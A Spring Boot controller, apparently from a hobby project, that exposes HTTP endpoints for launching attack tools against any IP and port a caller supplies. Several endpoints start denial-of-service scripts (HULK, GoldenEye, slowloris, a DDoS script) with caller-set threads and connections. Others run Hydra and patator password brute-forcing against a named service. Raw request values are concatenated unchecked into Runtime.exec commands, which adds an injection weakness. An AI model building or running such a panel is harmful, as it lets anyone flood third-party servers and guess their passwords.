package com.zhoule.springboot.controller;


import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;


@RestController
public class UserController {


    @RequestMapping("/hulk")
    private void hulk(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String IP = map.get("IP");
        String Port = map.get("Port");

        System.out.println(map.get("IP"));
        System.out.println(map.get("Port"));

        String command = new String ("python F:\\vue-springboot\\springboot\\python\\Hulk.py" + " " + "http://" + IP + ":" + Port);
        System.out.println(command);
        try {
            // 运行test.py
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println(re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    @RequestMapping("/DDos")
    private void DDos(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String IP = map.get("IP");
        String Port = map.get("Port");

        System.out.println(map.get("IP"));
        System.out.println(map.get("Port"));


        String command = new String ("python F:\\vue-springboot\\springboot\\python\\ddos-attack.py" );
//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\ddos_attack.py" + " " + "http://" + IP + ":" + Port);
        System.out.println(command);
        try {
            // 运行test.py
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println(re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @RequestMapping("/GoldenEye")
    private void GoldenEye(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String Threads = map.get("Threads");
        String Connections = map.get("Connections");
        String IP = map.get("IP");
        String Port = map.get("Port");
        String Way = map.get("Way");

        System.out.println(map);
        System.out.println(map.get("Way"));
        System.out.println(map.get("Connections"));
        System.out.println(map.get("Threads"));
        System.out.println(map.get("IP"));
        System.out.println(map.get("Port"));


//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\goldeneye.py" );
        String command = new String ("python F:\\vue-springboot\\springboot\\python\\goldeneye.py" + " " + "http://" + IP + ":" + Port + "/" + " " + "-w" + " " + Threads + " " + "-s" +" " +  Connections + " " + "-m" + " " + Way );
        System.out.println(command);
        try {
            // 运行test.py
            Process process = Runtime.getRuntime().exec(command);
            System.out.println("here");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println( "res is: " + re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @RequestMapping("/slowloris")
    private void slowloris(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String sleeptime = map.get("sleeptime");
        String Socket = map.get("Socket");
        String IP = map.get("IP");
        String Port = map.get("Port");

        System.out.println(map.get("sleeptime"));
        System.out.println(map.get("Socket"));
        System.out.println(map.get("IP"));
        System.out.println(map.get("Port"));


//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\slowloris.py" );


        String command = new String ("python F:\\vue-springboot\\springboot\\python\\slowloris.py" + " " + IP + " " + "-p" + " " + Port + " " + "-s" + " " + Socket + " " + "--sleeptime" + " " + sleeptime );
        System.out.println(command);
        try {
            // 运行test.py
            System.out.println("test.py");
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println(re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @RequestMapping("/slowhttptest")
    private void showhttptest(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String velocity = map.get("velocity");
        String Connections = map.get("Connections");
        String duration = map.get("duration");
        String mode = map.get("mode");
        String IP = map.get("IP");


        System.out.println(map.get("velocity"));
        System.out.println(map.get("Connections"));
        System.out.println(map.get("duration"));
        System.out.println(map.get("mode"));
        System.out.println(map.get("IP"));

//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\Hulk.py" + " " + "http://" + IP + ":" + Port);
//        System.out.println(command);
//        try {
//            // 运行test.py
//            Process process = Runtime.getRuntime().exec(command);
//            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
//            String line = null;
//            while ((line = in.readLine()) != null) {
//                System.out.println(line);
//            }
//            in.close();
//            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
//            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
//            int re = process.waitFor();
//            System.out.println(re);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }

    }

    @RequestMapping("/test")
    private void test(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");





        System.out.println(map);


//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\Hulk.py" + " " + "http://" + IP + ":" + Port);
//        System.out.println(command);
//        try {
//            // 运行test.py
//            Process process = Runtime.getRuntime().exec(command);
//            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
//            String line = null;
//            while ((line = in.readLine()) != null) {
//                System.out.println(line);
//            }
//            in.close();
//            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
//            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
//            int re = process.waitFor();
//            System.out.println(re);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }

    }

    @RequestMapping("/patator")
    private void patator(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String username = map.get("username");
        String IP = map.get("IP");
        String service = map.get("service");
        String password = map.get("password");

        System.out.println(map.get("username"));
        System.out.println(map.get("IP"));
        System.out.println(map.get("service"));
        System.out.println(map.get("password"));


//        String command = new String ("F:\\patator-windows-master\\patator.exe" );
        String command = new String ("F:\\patator-windows-master\\patator.exe" + " " + service + " " + "host=" + IP + " " + "user=" + username + " " + "password=FILE0 0=" + password );

//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\slowloris.py" + " " + IP + " " + "-p" + " " + Port + " " + "-s" + " " + Socket + " " + "--sleeptime" + " " + sleeptime );
        System.out.println(command);
        try {
            // 运行test.py
            System.out.println("test.py");
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println(re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    @RequestMapping("/Hydra")
    private void Hydra(@RequestBody Map<String, String> map) throws IOException, InterruptedException{
        // 依次为：python.exe的安装路径，test.py脚本的存储路径

        System.out.println("yo");

        String username = map.get("username");
        String IP = map.get("IP");
        String service = map.get("service");
        String Threads = map.get("Threads");
        String password = map.get("password");

        System.out.println(map.get("username"));
        System.out.println(map.get("IP"));
        System.out.println(map.get("Threads"));
        System.out.println(map.get("service"));
        System.out.println(map.get("password"));


//        String command = new String ("F:\\thc-hydra-windows-master\\hydra.exe" );
        String command = new String ("F:\\thc-hydra-windows-master\\hydra.exe" + " " + "-l" + " " + username + " " + "-P" + " " + password + " " + "-t" + " " + Threads + " " + IP + " " + service);

//        String command = new String ("python F:\\vue-springboot\\springboot\\python\\slowloris.py" + " " + IP + " " + "-p" + " " + Port + " " + "-s" + " " + Socket + " " + "--sleeptime" + " " + sleeptime );
        System.out.println(command);
        try {
            // 运行test.py
            System.out.println("test.py");
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
            String line = null;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            in.close();
            //java代码中的process.waitFor()返回值为0表示我们调用python脚本成功，
            //返回值为1表示调用python脚本失败，这和我们通常意义上见到的0与1定义正好相反
            int re = process.waitFor();
            System.out.println(re);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }




}
